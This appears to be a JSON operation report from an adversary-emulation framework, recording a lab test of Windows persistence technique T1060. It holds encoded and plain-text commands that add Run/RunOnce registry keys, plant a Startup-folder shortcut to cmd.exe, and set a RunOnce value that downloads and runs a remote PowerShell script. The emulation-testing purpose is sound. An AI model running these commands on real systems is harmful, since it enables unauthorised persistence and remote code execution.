@@ -1,0 +1,234 @@
+{
+    "adversary": {
+        "adversary_id": "f10c0419-49ed-41da-8416-2b47dbb86451",
+        "description": "t1060",
+        "id": 29,
+        "name": "T1060",
+        "phases": {
+            "1": [
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-1",
+                    "adversary_map_id": 278,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "cmd",
+                    "id": 194,
+                    "name": "T1060 - Registry Run Key / Startup Folder (T1060)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1060",
+                    "technique_name": "T1060 - Registry Run Key / Startup Folder (T1060)",
+                    "test": "UkVHIEFERCAiSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC9WICJkc2xhYnMiIC90IFJFR19TWiAvRiAvRCAiQzpcV2luZG93c1xTeXN0ZW0zMlxub3RlcGFkLmV4ZSI="
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-2",
+                    "adversary_map_id": 277,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "cmd",
+                    "id": 187,
+                    "name": "T1060 - Reg Key RunOnce",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1060",
+                    "technique_name": "T1060 - Reg Key RunOnce",
+                    "test": "UkVHIEFERCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bk9uY2VFeFwwMDAxXERlcGVuZCAvdiAxIC9kICJDOlxXaW5kb3dzXFN5c3RlbTMyXG5vdGVwYWQuZXhlIg=="
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-3",
+                    "adversary_map_id": 279,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "psh",
+                    "id": 195,
+                    "name": "T1060 - Reg Key RunOnce",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1060",
+                    "technique_name": "T1060 - Reg Key RunOnce",
+                    "test": "JFJ1bk9uY2VLZXkgPSAiSEtMTTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZSI7CnNldC1pdGVtcHJvcGVydHkgJFJ1bk9uY2VLZXkgIk5leHRSdW4iICdwb3dlcnNoZWxsLmV4ZSAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvQVJUaWZhY3RzL01pc2MvRGlzY292ZXJ5LmJhdGAiKSInOwpSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICRSdW5PbmNlS2V5IC1OYW1lICJOZXh0UnVuIiAtRm9yY2U7"
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-3",
+                    "adversary_map_id": 279,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "pwsh",
+                    "id": 196,
+                    "name": "T1060 - Reg Key RunOnce",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1060",
+                    "technique_name": "T1060 - Reg Key RunOnce",
+                    "test": "JFJ1bk9uY2VLZXkgPSAiSEtMTTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZSI7CnNldC1pdGVtcHJvcGVydHkgJFJ1bk9uY2VLZXkgIk5leHRSdW4iICdwb3dlcnNoZWxsLmV4ZSAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvQVJUaWZhY3RzL01pc2MvRGlzY292ZXJ5LmJhdGAiKSInOwpSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICRSdW5PbmNlS2V5IC1OYW1lICJOZXh0UnVuIiAtRm9yY2U7"
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-4",
+                    "adversary_map_id": 276,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "psh",
+                    "id": 185,
+                    "name": "T1060 - Startup Folder",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1060",
+                    "technique_name": "T1060 - Startup Folder",
+                    "test": "JFRhcmdldEZpbGUgPSAiJGVudjpTeXN0ZW1Sb290XFN5c3RlbTMyXGNtZC5leGUiOwokU2hvcnRjdXRGaWxlID0gIkM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnRVcFxOb3RlcGFkLmxuayI7CiRXU2NyaXB0U2hlbGwgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV1NjcmlwdC5TaGVsbDsKJFNob3J0Y3V0ID0gJFdTY3JpcHRTaGVsbC5DcmVhdGVTaG9ydGN1dCgkU2hvcnRjdXRGaWxlKTsKJFNob3J0Y3V0LlRhcmdldFBhdGggPSAkVGFyZ2V0RmlsZTsKJFNob3J0Y3V0LlNhdmUoKTs="
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-4",
+                    "adversary_map_id": 276,
+                    "cleanup": "",
+                    "description": "",
+                    "executor": "pwsh",
+                    "id": 186,
+                    "name": "T1060 - Startup Folder",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1060",
+                    "technique_name": "T1060 - Startup Folder",
+                    "test": "JFRhcmdldEZpbGUgPSAiJGVudjpTeXN0ZW1Sb290XFN5c3RlbTMyXGNtZC5leGUiOwokU2hvcnRjdXRGaWxlID0gIkM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnRVcFxOb3RlcGFkLmxuayI7CiRXU2NyaXB0U2hlbGwgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV1NjcmlwdC5TaGVsbDsKJFNob3J0Y3V0ID0gJFdTY3JpcHRTaGVsbC5DcmVhdGVTaG9ydGN1dCgkU2hvcnRjdXRGaWxlKTsKJFNob3J0Y3V0LlRhcmdldFBhdGggPSAkVGFyZ2V0RmlsZTsKJFNob3J0Y3V0LlNhdmUoKTs="
+                }
+            ]
+        }
+    },
+    "facts": [],
+    "finish": "2019-10-30 15:11:53",
+    "host_group": [
+        {
+            "architecture": "amd64",
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ],
+            "host_group": "my_group",
+            "id": 1,
+            "last_seen": "2019-10-30 15:11:51",
+            "last_trusted_seen": "2019-10-30 15:11:51",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "paw": "AJ-Win7x64$AJ-Win7x64\\testuser",
+            "pid": 2744,
+            "platform": "windows",
+            "ppid": 3716,
+            "server": "http://10.203.202.154:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": 1
+        }
+    ],
+    "id": 1,
+    "jitter": "4/8",
+    "name": "t1060",
+    "planner": {
+        "id": 1,
+        "module": "plugins.stockpile.app.sequential",
+        "name": "sequential",
+        "params": {}
+    },
+    "skipped_abilities": [
+        {
+            "AJ-Win7x64$AJ-Win7x64\\testuser": []
+        }
+    ],
+    "start": "2019-10-30 15:11:23",
+    "steps": {
+        "AJ-Win7x64$AJ-Win7x64\\testuser": {
+            "agent_id": 1,
+            "steps": [
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-4",
+                    "attack": {
+                        "tactic": "execution",
+                        "technique_id": "T1060",
+                        "technique_name": "T1060 - Startup Folder"
+                    },
+                    "command": "$TargetFile = \"$env:SystemRoot\\System32\\cmd.exe\";$ShortcutFile = \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Notepad.lnk\";$WScriptShell = New-Object -ComObject WScript.Shell;$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile);$Shortcut.TargetPath = $TargetFile;$Shortcut.Save();",
+                    "delegated": "2019-10-30 15:11:37.260427",
+                    "description": "",
+                    "executor": "psh",
+                    "name": "T1060 - Startup Folder",
+                    "platform": "windows",
+                    "run": "2019-10-30 15:11:37",
+                    "status": 0
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-2",
+                    "attack": {
+                        "tactic": "execution",
+                        "technique_id": "T1060",
+                        "technique_name": "T1060 - Reg Key RunOnce"
+                    },
+                    "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Windows\\System32\\notepad.exe\"",
+                    "delegated": "2019-10-30 15:11:37.260558",
+                    "description": "",
+                    "executor": "cmd",
+                    "name": "T1060 - Reg Key RunOnce",
+                    "platform": "windows",
+                    "run": "2019-10-30 15:11:41",
+                    "status": 0
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-1",
+                    "attack": {
+                        "tactic": "execution",
+                        "technique_id": "T1060",
+                        "technique_name": "T1060 - Registry Run Key / Startup Folder (T1060)"
+                    },
+                    "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"dslabs\" /t REG_SZ /F /D \"C:\\Windows\\System32\\notepad.exe\"",
+                    "delegated": "2019-10-30 15:11:37.260679",
+                    "description": "",
+                    "executor": "cmd",
+                    "name": "T1060 - Registry Run Key / Startup Folder (T1060)",
+                    "platform": "windows",
+                    "run": "2019-10-30 15:11:47",
+                    "status": 0
+                },
+                {
+                    "ability_id": "4b2e9574-b1a7-4b38-95b2-6054ded9T1060-3",
+                    "attack": {
+                        "tactic": "execution",
+                        "technique_id": "T1060",
+                        "technique_name": "T1060 - Reg Key RunOnce"
+                    },
+                    "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\";set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"';Remove-ItemProperty -Path $RunOnceKey -Name \"NextRun\" -Force;",
+                    "delegated": "2019-10-30 15:11:37.260769",
+                    "description": "",
+                    "executor": "psh",
+                    "name": "T1060 - Reg Key RunOnce",
+                    "platform": "windows",
+                    "run": "2019-10-30 15:11:51",
+                    "status": 0
+                }
+            ]
+        }
+    }
+}
